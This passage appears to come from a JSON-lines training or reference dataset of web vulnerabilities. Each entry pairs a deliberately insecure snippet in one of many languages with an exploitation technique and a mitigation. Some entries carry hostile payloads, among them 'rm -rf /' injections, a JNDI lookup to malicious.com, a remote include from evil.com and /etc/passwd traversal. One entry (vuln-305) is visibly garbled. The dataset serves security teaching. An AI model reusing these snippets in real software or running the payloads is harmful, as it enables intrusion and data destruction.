  "vulnerability_type": "Insecure File Download",
  "description": "Serving unvalidated files.",
  "code_snippet": "Files.copy(Paths.get(\"files/\" + request.getParameter(\"file\")), response.getOutputStream());",
  "exploitation_techniques": "Download ../../etc/passwd.",
  "mitigation": "Use Paths.get(baseDir, file).normalize(); check prefix."
}
{
  "id": "vuln-277",
  "language": "PHP",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "readfile('files/' . $_GET['file']);",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Validate: realpath('files/' . $file) starts with base dir."
}
{
  "id": "vuln-278",
  "language": "Ruby",
  "vulnerability_type": "Insecure File Download",
  "description": "Unvalidated file serving.",
  "code_snippet": "send_file \"files/#{params[:file]}\"",
  "exploitation_techniques": "Download ../../etc/passwd.",
  "mitigation": "Use File.expand_path; check base dir."
}
{
  "id": "vuln-279",
  "language": "Go",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "http.ServeFile(w, r, \"files/\"+r.URL.Query().Get(\"file\"))",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Use filepath.Join(baseDir, file); validate path."
}
{
  "id": "vuln-280",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving unvalidated files.",
  "code_snippet": "return PhysicalFile($\"files/{Request.Query[\"file\"]}\", \"application/octet-stream\");",
  "exploitation_techniques": "Download ../../web.config.",
  "mitigation": "Validate: Path.Combine(baseDir, file); check prefix."
}
{
  "id": "vuln-281",
  "language": "Kotlin",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "call.respondFile(File(\"files/${call.request.queryParameters[\"file\"]}\"))",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Use File(baseDir, file).canonicalPath; check prefix."
}
{
  "id": "vuln-282",
  "language": "Scala",
  "vulnerability_type": "Insecure File Download",
  "description": "Unvalidated file serving.",
  "code_snippet": "Ok.sendFile(new File(s\"files/${params(\"file\")}\"))",
  "exploitation_techniques": "Download ../../etc/passwd.",
  "mitigation": "Validate: new File(baseDir, file).getCanonicalPath startsWith baseDir."
}
{
  "id": "vuln-283",
  "language": "Rust",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "fs::read_to_string(&req.query(\"file\")?).map(|c| res.render_text(c))",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Use Path::new(base_dir).join(file).canonicalize(); check prefix."
}
{
  "id": "vuln-284",
  "language": "Elixir",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving unvalidated files.",
  "code_snippet": "send_download(conn, {:file, \"files/\" <> params[\"file\"]}",
  "exploitation_techniques": "Download ../../etc/passwd.",
  "mitigation": "Validate: Path.expand(\"files/\" <> file) starts with base dir."
}
{
  "id": "vuln-285",
  "language": "Perl",
  "vulnerability_type": "Insecure File Download",
  "description": "Serving files with user input.",
  "code_snippet": "open(my $fh, '<', \"files/$filename\"); $r->sendfile($fh);",
  "exploitation_techniques": "Access ../../etc/passwd.",
  "mitigation": "Validate: realpath(\"files/$filename\") =~ /^$base_dir/."
}
{
  "id": "vuln-286",
  "language": "Node.js",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No input validation in GraphQL resolvers.",
  "code_snippet": "const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };",
  "exploitation_techniques": "Inject malicious IDs or SQL.",
  "mitigation": "Validate: if (!/^[0-9]+$/.test(id)) throw Error('Invalid ID');"
}
{
  "id": "vuln-287",
  "language": "Python",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in Graphene resolvers.",
  "code_snippet": "class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: if not id.isdigit(): raise ValueError('Invalid ID')"
}
{
  "id": "vuln-288",
  "language": "Java",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No input validation in GraphQL-Java.",
  "code_snippet": "@GraphQLField public User user(@GraphQLArgument(name = \"id\") String id) { return db.findUser(id); }",
  "exploitation_techniques": "Inject malicious IDs.",
  "mitigation": "Validate: if (!id.matches(\"^[0-9]+$\")) throw new IllegalArgumentException();"
}
{
  "id": "vuln-289",
  "language": "PHP",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in GraphQL-PHP resolvers.",
  "code_snippet": "'user' => function ($root, $args) { return $db->findUser($args['id']); }",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: if (!ctype_digit($args['id'])) throw new Exception('Invalid ID');"
}
{
  "id": "vuln-290",
  "language": "Ruby",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in GraphQL-Ruby.",
  "code_snippet": "field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end",
  "exploitation_techniques": "Inject malicious IDs.",
  "mitigation": "Validate: raise 'Invalid ID' unless id =~ /^[0-9]+$/;"
}
{
  "id": "vuln-291",
  "language": "Go",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in gqlgen resolvers.",
  "code_snippet": "func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: if !regexp.MustCompile(`^[0-9]+$`).MatchString(id) { return nil, errors.New(\"Invalid ID\") }"
}
{
  "id": "vuln-292",
  "language": "C# (.NET)",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in HotChocolate resolvers.",
  "code_snippet": "public User GetUser(string id) => db.FindUser(id);",
  "exploitation_techniques": "Inject malicious IDs.",
  "mitigation": "Validate: if (!Regex.IsMatch(id, \"^[0-9]+$\")) throw new ArgumentException();"
}
{
  "id": "vuln-293",
  "language": "Kotlin",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in GraphQL-Kotlin.",
  "code_snippet": "fun user(id: String): User = db.findUser(id)",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: if (!id.matches(Regex(\"^[0-9]+$\"))) throw IllegalArgumentException(\"Invalid ID\")"
}
{
  "id": "vuln-294",
  "language": "Scala",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in Sangria resolvers.",
  "code_snippet": "Field(\"user\", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))",
  "exploitation_techniques": "Inject malicious IDs.",
  "mitigation": "Validate: if (ctx.arg(ID).matches(\"^[0-9]+$\")) db.findUser else throw new Exception"
}
{
  "id": "vuln-295",
  "language": "Rust",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in Juniper resolvers.",
  "code_snippet": "fn user(id: String) -> Option<User> { db.find_user(&id) }",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: if id.chars().all(|c| c.is_digit(10)) { db.find_user(&id) } else { None }"
}
{
  "id": "vuln-296",
  "language": "Elixir",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in Absinthe resolvers.",
  "code_snippet": "field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end",
  "exploitation_techniques": "Inject malicious IDs.",
  "mitigation": "Validate: if String.match?(id, ~r/^[0-9]+$/) do Repo.get(User, id) else {:error, \"Invalid ID\"} end"
}
{
  "id": "vuln-297",
  "language": "Perl",
  "vulnerability_type": "Unvalidated Input in GraphQL",
  "description": "No validation in GraphQL resolvers.",
  "code_snippet": "sub user { my ($args) = @_; return $db->find_user($args->{id}); }",
  "exploitation_techniques": "Inject malicious input.",
  "mitigation": "Validate: return undef unless $args->{id} =~ /^[0-9]+$/;"
}
{
  "id": "vuln-298",
  "language": "Node.js",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data.",
  "code_snippet": "console.log(`User login: ${user.email}, ${user.password}`);",
  "exploitation_techniques": "Access logs to extract credentials.",
  "mitigation": "Avoid logging sensitive data: console.log(`User login: ${user.id}`);"
}
{
  "id": "vuln-299",
  "language": "Python",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "logging.info(f'User login: {user.email}, {user.password}')",
  "exploitation_techniques": "Read logs for credentials.",
  "mitigation": "Log safely: logging.info(f'User login: {user.id}')"
}
{
  "id": "vuln-300",
  "language": "Java",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data.",
  "code_snippet": "log.info(\"User login: {} {}\", user.getEmail(), user.getPassword());",
  "exploitation_techniques": "Extract credentials from logs.",
  "mitigation": "Log: log.info(\"User login: {}\", user.getId());"
}
{
  "id": "vuln-301",
  "language": "PHP",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data to unprotected logs.",
  "code_snippet": "error_log('User login: ' . $user['email'] . ', ' . $user['password']);",
  "exploitation_techniques": "Access log files to extract credentials or PII.",
  "mitigation": "Avoid logging sensitive data: error_log('User login: ' . $user['id']); Use secure log storage."
}
{
  "id": "vuln-302",
  "language": "Ruby",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information in plain text.",
  "code_snippet": "Rails.logger.info \"User login: #{user.email}, #{user.password}\"",
  "exploitation_techniques": "Read logs to obtain credentials or session tokens.",
  "mitigation": "Log only non-sensitive data: Rails.logger.info \"User login: #{user.id}\""
}
{
  "id": "vuln-303",
  "language": "Go",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data to stdout or files.",
  "code_snippet": "log.Printf(\"User login: %s, %s\", user.Email, user.Password)",
  "exploitation_techniques": "Access logs via exposed endpoints or file leaks.",
  "mitigation": "Log: log.Printf(\"User login: %s\", user.ID); Use structured logging with redaction."
}
{
  "id": "vuln-304",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data without redaction.",
  "code_snippet": "logger.LogInformation(\"User login: {Email}, {Password}\", user.Email, user.Password);",
  "exploitation_techniques": "Extract credentials from log files or monitoring systems.",
  "mitigation": "Log: logger.LogInformation(\"User login: {Id}\", user.Id); Use Serilog with redaction."
}
{
  "id": "vuln-305",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data in plain text.",
  "code_snippet": "logger.info(\"User login: ${user.email}, ${user.password}\")",
  "exploitation_techniques": "Access logs to steal credentials.",
  "mitigationබ
  "mitigation": "Log: logger.info(\"User login: ${user.id}\"); Redact sensitive fields."
}
{
  "id": "vuln-306",
  "language": "Scala",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data without sanitization.",
  "code_snippet": "logger.info(s\"User login: ${user.email}, ${user.password}\")",
  "exploitation_techniques": "Extract PII or credentials from logs.",
  "mitigation": "Log: logger.info(s\"User login: ${user.id}\"); Use secure logging frameworks."
}
{
  "id": "vuln-307",
  "language": "Rust",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data to unsecured logs.",
  "code_snippet": "log::info!(\"User login: {}, {}\", user.email, user.password);",
  "exploitation_techniques": "Access logs via misconfigured storage.",
  "mitigation": "Log: log::info!(\"User login: {}\", user.id); Use log redaction."
}
{
  "id": "vuln-308",
  "language": "Elixir",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data in plain text.",
  "code_snippet": "Logger.info(\"User login: #{user.email}, #{user.password}\")",
  "exploitation_techniques": "Steal credentials from log files.",
  "mitigation": "Log: Logger.info(\"User login: #{user.id}\"); Secure log access."
}
{
  "id": "vuln-309",
  "language": "Perl",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data to files.",
  "code_snippet": "print LOG \"User login: $user->{email}, $user->{password}\\n\";",
  "exploitation_techniques": "Access unprotected log files.",
  "mitigation": "Log: print LOG \"User login: $user->{id}\\n\"; Restrict log access."
}
{
  "id": "vuln-310",
  "language": "Node.js",
  "vulnerability_type": "Prototype Pollution",
  "description": "Merging objects without sanitization.",
  "code_snippet": "Object.assign({}, req.body);",
  "exploitation_techniques": "Inject __proto__ to alter object behavior: {\"__proto__\": {\"admin\": true}}",
  "mitigation": "Use Object.create(null) or libraries like lodash.cloneDeep."
}
{
  "id": "vuln-311",
  "language": "Python",
  "vulnerability_type": "Prototype Pollution Equivalent",
  "description": "Dynamic attribute assignment on objects.",
  "code_snippet": "for key, value in user_input.items(): setattr(obj, key, value)",
  "exploitation_techniques": "Inject __class__ or __init__ to manipulate object behavior.",
  "mitigation": "Whitelist allowed attributes: if key in allowed_attrs: setattr(obj, key, value)"
}
{
  "id": "vuln-312",
  "language": "Java",
  "vulnerability_type": "Reflection Injection",
  "description": "Dynamic method invocation with user input.",
  "code_snippet": "Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);",
  "exploitation_techniques": "Invoke dangerous methods like Runtime.exec.",
  "mitigation": "Whitelist allowed classes and methods."
}
{
  "id": "vuln-313",
  "language": "PHP",
  "vulnerability_type": "Dynamic Function Call",
  "description": "Calling functions based on user input.",
  "code_snippet": "$func = $_GET['action']; $func();",
  "exploitation_techniques": "Call dangerous functions like eval or system.",
  "mitigation": "Whitelist: if (in_array($func, ['safe_func1', 'safe_func2'])) $func();"
}
{
  "id": "vuln-314",
  "language": "Ruby",
  "vulnerability_type": "Dynamic Method Invocation",
  "description": "Invoking methods based on user input.",
  "code_snippet": "obj.send(params[:method])",
  "exploitation_techniques": "Call sensitive methods like instance_eval.",
  "mitigation": "Whitelist: obj.send(method) if %w[safe_method1 safe_method2].include?(method)"
}
{
  "id": "vuln-315",
  "language": "Go",
  "vulnerability_type": "Race Condition",
  "description": "Concurrent access to shared resources.",
  "code_snippet": "if counter > 0 { counter--; doWork() }",
  "exploitation_techniques": "Exploit TOCTOU to bypass checks.",
  "mitigation": "Use sync.Mutex: mu.Lock(); defer mu.Unlock();"
}
{
  "id": "vuln-316",
  "language": "C# (.NET)",
  "vulnerability_type": "Race Condition",
  "description": "Non-atomic operations on shared state.",
  "code_snippet": "if (counter > 0) { counter--; DoWork(); }",
  "exploitation_techniques": "Concurrent threads bypass counter check.",
  "mitigation": "Use lock: lock (syncRoot) { if (counter > 0) counter--; }"
}
{
  "id": "vuln-317",
  "language": "Kotlin",
  "vulnerability_type": "Race Condition",
  "description": "Non-synchronized shared resource access.",
  "code_snippet": "if (counter > 0) { counter--; doWork() }",
  "exploitation_techniques": "Race condition to skip counter decrement.",
  "mitigation": "Use synchronized: synchronized(lock) { if (counter > 0) counter-- }"
}
{
  "id": "vuln-318",
  "language": "Scala",
  "vulnerability_type": "Race Condition",
  "description": "Concurrent access to shared variable.",
  "code_snippet": "if (counter > 0) { counter -= 1; doWork() }",
  "exploitation_techniques": "Exploit race to bypass counter.",
  "mitigation": "Use synchronized or Akka actors for concurrency."
}
{
  "id": "vuln-319",
  "language": "Rust",
  "vulnerability_type": "Race Condition",
  "description": "Unsynchronized shared state access.",
  "code_snippet": "if *counter > 0 { *counter -= 1; do_work(); }",
  "exploitation_techniques": "Concurrent access bypasses counter.",
  "mitigation": "Use Mutex: let mut counter = counter.lock().unwrap();"
}
{
  "id": "vuln-320",
  "language": "Elixir",
  "vulnerability_type": "Message Passing Race",
  "description": "Uncoordinated message passing in GenServer.",
  "code_snippet": "def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}",
  "exploitation_techniques": "Concurrent calls cause inconsistent state.",
  "mitigation": "Use GenServer state management to enforce atomicity."
}
{
  "id": "vuln-321",
  "language": "Perl",
  "vulnerability_type": "Race Condition",
  "description": "File access race condition.",
  "code_snippet": "if (-e $file) { open(my $fh, '>', $file); }",
  "exploitation_techniques": "TOCTOU attack to overwrite files.",
  "mitigation": "Use flock for file locking."
}
{
  "id": "vuln-322",
  "language": "Node.js",
  "vulnerability_type": "Server-Side Template Injection",
  "description": "Dynamic template rendering with user input.",
  "code_snippet": "const template = Handlebars.compile(userInput); res.send(template(data));",
  "exploitation_techniques": "Inject {{process.mainModule.require('child_process').execSync('rm -rf /')}}",
  "mitigation": "Avoid user input in templates; use precompiled templates."
}
{
  "id": "vuln-323",
  "language": "Python",
  "vulnerability_type": "Code Injection via Dynamic Execution",
  "description": "Executing user input as code.",
  "code_snippet": "exec(user_input)",
  "exploitation_techniques": "Inject: __import__('os').system('rm -rf /')",
  "mitigation": "Never use exec; use safe alternatives like ast.literal_eval."
}
{
  "id": "vuln-324",
  "language": "Java",
  "vulnerability_type": "Script Engine Injection",
  "description": "Running user input in script engine.",
  "code_snippet": "ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\"); engine.eval(userInput);",
  "exploitation_techniques": "Inject JavaScript to call Java methods.",
  "mitigation": "Avoid user input in script engines; use static scripts."
}
{
  "id": "vuln-325",
  "language": "PHP",
  "vulnerability_type": "Dynamic Include",
  "description": "Including files based on user input.",
  "code_snippet": "include $_GET['page'] . '.php';",
  "exploitation_techniques": "Include malicious file: ?page=../../etc/passwd",
  "mitigation": "Whitelist: if (in_array($page, ['home', 'about'])) include $page . '.php';"
}
{
  "id": "vuln-326",
  "language": "Ruby",
  "vulnerability_type": "Dynamic Constant Assignment",
  "description": "Assigning constants dynamically with user input.",
  "code_snippet": "Object.const_set(params[:name], Class.new)",
  "exploitation_techniques": "Inject malicious class names to alter behavior.",
  "mitigation": "Avoid dynamic constants; use predefined names."
}
{
  "id": "vuln-327",
  "language": "Go",
  "vulnerability_type": "SQL Injection via Dynamic Queries",
  "description": "Dynamic SQL query construction.",
  "code_snippet": "db.Query(fmt.Sprintf(\"SELECT * FROM users WHERE name = '%s'\", userInput))",
  "exploitation_techniques": "Inject: ' OR 1=1--",
  "mitigation": "Use prepared statements: db.Query(\"SELECT * FROM users WHERE name = ?\", userInput)"
}
{
  "id": "vuln-328",
  "language": "C# (.NET)",
  "vulnerability_type": "Dynamic Code Execution",
  "description": "Executing dynamic C# code.",
  "code_snippet": "CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();",
  "exploitation_techniques": "Inject malicious C# code.",
  "mitigation": "Avoid dynamic code execution; use static assemblies."
}
{
  "id": "vuln-329",
  "language": "Kotlin",
  "vulnerability_type": "Script Engine Injection",
  "description": "Running user input in Kotlin script engine.",
  "code_snippet": "val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput)",
  "exploitation_techniques": "Inject malicious Kotlin code.",
  "mitigation": "Use static scripts; avoid user input."
}
{
  "id": "vuln-330",
  "language": "Scala",
  "vulnerability_type": "Dynamic Code Evaluation",
  "description": "Evaluating user input as Scala code.",
  "code_snippet": "scala.tools.nsc.interpreter.IMain().interpret(userInput)",
  "exploitation_techniques": "Inject malicious Scala code.",
  "mitigation": "Avoid dynamic evaluation; use predefined logic."
}
{
  "id": "vuln-331",
  "language": "Rust",
  "vulnerability_type": "Unsafe Memory Access",
  "description": "Using unsafe block with unvalidated input.",
  "code_snippet": "unsafe { let ptr = input as *mut i32; *ptr = 42; }",
  "exploitation_techniques": "Manipulate pointer to cause memory corruption.",
  "mitigation": "Avoid unsafe; use safe Rust abstractions."
}
{
  "id": "vuln-332",
  "language": "Elixir",
  "vulnerability_type": "Dynamic Code Execution",
  "description": "Evaluating user input as Elixir code.",
  "code_snippet": "Code.eval_string(user_input)",
  "exploitation_techniques": "Inject: System.cmd(\"rm\", [\"-rf\", \"/\"])",
  "mitigation": "Never evaluate user input; use static functions."
}
{
  "id": "vuln-333",
  "language": "Perl",
  "vulnerability_type": "Dynamic Code Execution",
  "description": "Evaluating user input as Perl code.",
  "code_snippet": "eval $user_input;",
  "exploitation_techniques": "Inject: system('rm -rf /');",
  "mitigation": "Avoid eval; use predefined subroutines."
}
{
  "id": "vuln-334",
  "language": "Node.js",
  "vulnerability_type": "Regex Injection",
  "description": "Using user input in regex patterns.",
  "code_snippet": "const regex = new RegExp(req.query.pattern); string.match(regex);",
  "exploitation_techniques": "Inject complex regex for ReDoS.",
  "mitigation": "Sanitize: if (!pattern.match(/^[a-zA-Z0-9]+$/)) throw Error('Invalid pattern');"
}
{
  "id": "vuln-335",
  "language": "Python",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "regex = re.compile(request.args.get('pattern')); regex.match(string)",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS attack.",
  "mitigation": "Validate: if re.match(r'^[a-zA-Z0-9]+$', pattern): re.compile(pattern)"
}
{
  "id": "vuln-336",
  "language": "Java",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex compilation.",
  "code_snippet": "Pattern pattern = Pattern.compile(request.getParameter(\"pattern\")); pattern.matcher(string);",
  "exploitation_techniques": "Inject complex regex for DoS.",
  "mitigation": "Validate: if (pattern.matches(\"^[a-zA-Z0-9]+$\")) Pattern.compile(pattern);"
}
{
  "id": "vuln-337",
  "language": "PHP",
  "vulnerability_type": "Regex Injection",
  "description": "User input in preg_match pattern.",
  "code_snippet": "preg_match('/' . $_GET['pattern'] . '/', $string);",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: if (preg_match('/^[a-zA-Z0-9]+$/', $pattern)) preg_match('/' . $pattern . '/');"
}
{
  "id": "vuln-338",
  "language": "Ruby",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "regex = Regexp.new(params[:pattern]); string =~ regex",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: regex = Regexp.new(pattern) if pattern =~ /^[a-zA-Z0-9]+$/;"
}
{
  "id": "vuln-339",
  "language": "Go",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex compilation.",
  "code_snippet": "regex, _ := regexp.Compile(r.URL.Query().Get(\"pattern\")); regex.MatchString(string)",
  "exploitation_techniques": "Inject complex regex for DoS.",
  "mitigation": "Validate: if regexp.MatchString(`^[a-zA-Z0-9]+$`, pattern) { regexp.Compile(pattern) }"
}
{
  "id": "vuln-340",
  "language": "C# (.NET)",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "Regex regex = new Regex(Request.Query[\"pattern\"]); regex.IsMatch(input);",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: if (Regex.IsMatch(pattern, \"^[a-zA-Z0-9]+$\")) new Regex(pattern);"
}
{
  "id": "vuln-341",
  "language": "Kotlin",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex compilation.",
  "code_snippet": "val regex = request.queryParameters[\"pattern\"]!!.toRegex(); regex.matches(input)",
  "exploitation_techniques": "Inject complex regex for DoS.",
  "mitigation": "Validate: if (pattern.matches(Regex(\"^[a-zA-Z0-9]+$\"))) pattern.toRegex()"
}
{
  "id": "vuln-342",
  "language": "Scala",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "val regex = params(\"pattern\").r; regex.findFirstIn(input)",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: if (pattern.matches(\"^[a-zA-Z0-9]+$\")) pattern.r"
}
{
  "id": "vuln-343",
  "language": "Rust",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex compilation.",
  "code_snippet": "let regex = Regex::new(&req.query(\"pattern\")?).unwrap(); regex.is_match(&input)",
  "exploitation_techniques": "Inject complex regex for DoS.",
  "mitigation": "Validate: if pattern.chars().all(|c| c.is_alphanumeric()) { Regex::new(&pattern) }"
}
{
  "id": "vuln-344",
  "language": "Elixir",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: if String.match?(pattern, ~r/^[a-zA-Z0-9]+$/) do Regex.compile!(pattern) end"
}
{
  "id": "vuln-345",
  "language": "Perl",
  "vulnerability_type": "Regex Injection",
  "description": "Dynamic regex from user input.",
  "code_snippet": "if ($input =~ /$pattern/) { ... }",
  "exploitation_techniques": "Inject: (a+)+ for ReDoS.",
  "mitigation": "Validate: if ($pattern =~ /^[a-zA-Z0-9]+$/) { ... }"
}
{
  "id": "vuln-346",
  "language": "Node.js",
  "vulnerability_type": "Prototype Pollution in Dependencies",
  "description": "Vulnerable library allowing prototype pollution.",
  "code_snippet": "const merge = require('lodash.merge'); merge({}, JSON.parse(userInput));",
  "exploitation_techniques": "Inject __proto__ to alter object behavior.",
  "mitigation": "Update to patched lodash version; avoid deep merges with user input."
}
{
  "id": "vuln-347",
  "language": "Python",
  "vulnerability_type": "Insecure Pickle Usage",
  "description": "Deserialization of untrusted pickle data.",
  "code_snippet": "import pickle; obj = pickle.loads(request.data)",
  "exploitation_techniques": "Craft malicious pickle payload for RCE.",
  "mitigation": "Use JSON or YAML.safe_load; avoid pickle for user input."
}
{
  "id": "vuln-348",
  "language": "Java",
  "vulnerability_type": "JNDI Injection",
  "description": "Untrusted input in JNDI lookups.",
  "code_snippet": "InitialContext ctx = new InitialContext(); ctx.lookup(userInput);",
  "exploitation_techniques": "Inject: ldap://malicious.com/a for RCE.",
  "mitigation": "Validate input; disable JNDI remote lookups."
}
{
  "id": "vuln-349",
  "language": "PHP",
  "vulnerability_type": "Remote File Inclusion",
  "description": "Including remote files based on user input.",
  "code_snippet": "include($_GET['file']);",
  "exploitation_techniques": "Inject: http://evil.com/malicious.php",
  "mitigation": "Disable allow_url_include; whitelist local files."
}
{
  "id": "vuln-350",
  "language": "Ruby",
  "vulnerability_type": "Mass Assignment Vulnerability",
  "description": "Unrestricted model attribute updates.",
  "code_snippet": "User.update(params[:user])",
  "exploitation_techniques": "Inject admin: true in params.",
  "mitigation": "Use strong parameters: params.require(:user).permit(:name, :email)"
}
{
  "id": "vuln-351",
  "language": "Go",
  "vulnerability_type": "Insecure HTTP Client",
  "description": "HTTP client without TLS verification.",
  "code_snippet": "client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};",
  "exploitation_techniques": "MITM attacks to intercept traffic.",
  "mitigation": "Set InsecureSkipVerify: false; validate certificates."
}
{
  "id": "vuln-352",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Ignoring TLS certificate validation.",
  "code_snippet": "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;",
  "exploitation_techniques": "MITM attack to spoof server.",
  "mitigation": "Use default validation or custom strict validation."
}
{
  "id": "vuln-353",
  "language": "Kotlin",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Bypassing TLS certificate checks.",
  "code_snippet": "val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()",
  "exploitation_techniques": "MITM to intercept requests.",
  "mitigation": "Use default SSL configuration with proper validation."
}
{
  "id": "vuln-354",
  "language": "Scala",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Disabling TLS verification.",
  "code_snippet": "WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true)))",
  "exploitation_techniques": "MITM attack to spoof server.",
  "mitigation": "Enable certificate verification."
}
{
  "id": "vuln-355",
  "language": "Rust",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Skipping TLS certificate validation.",
  "code_snippet": "let client = Client::builder().danger_accept_invalid_certs(true).build()?;",
  "exploitation_techniques": "MITM to intercept traffic.",
  "mitigation": "Use default TLS settings with validation."
}
{
  "id": "vuln-356",
  "language": "Elixir",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Disabling TLS verification.",
  "code_snippet": ":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])",
  "exploitation_techniques": "MITM attack to spoof server.",
  "mitigation": "Set verify: :verify_peer; use CA certificates."
}
{
  "id": "vuln-357",
  "language": "Perl",
  "vulnerability_type": "Insecure TLS Configuration",
  "description": "Bypassing TLS certificate checks.",
  "code_snippet": "use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);",
  "exploitation_techniques": "MITM to intercept requests.",
  "mitigation": "Enable ssl_opts(verify_hostname => 1)."
}
{
  "id": "vuln-358",
  "language": "Node.js",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connections.",
  "code_snippet": "const ws = new WebSocket('ws://example.com');",
  "exploitation_techniques": "MITM to intercept WebSocket traffic.",
  "mitigation": "Use wss:// for encrypted connections."
}
{
  "id": "vuln-359",
  "language": "Python",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using ws:// instead of wss://.",
  "code_snippet": "websocket.connect('ws://example.com')",
  "exploitation_techniques": "Sniff unencrypted WebSocket traffic.",
  "mitigation": "Use websocket.connect('wss://example.com')"
}
{
  "id": "vuln-360",
  "language": "Java",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connections.",
  "code_snippet": "WebSocketClient client = new WebSocketClient(new URI(\"ws://example.com\"));",
  "exploitation_techniques": "MITM to capture WebSocket data.",
  "mitigation": "Use wss://example.com for secure connections."
}
{
  "id": "vuln-361",
  "language": "PHP",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Using unencrypted WebSocket.",
  "code_snippet": "$client = new WebSocket('ws://example.com');",
  "exploitation_techniques": "Intercept unencrypted traffic.",
  "mitigation": "Use wss:// for WebSocket connections."
}
{
  "id": "vuln-362",
  "language": "Ruby",
  "vulnerability_type": "Insecure WebSocket",
  "description": "Unencrypted WebSocket connection.",
  "code_snippet": "Faye::WebSocket::Client.new('ws://example.com')",
  "exploitation_techniques": "Sniff WebSocket traffic.",
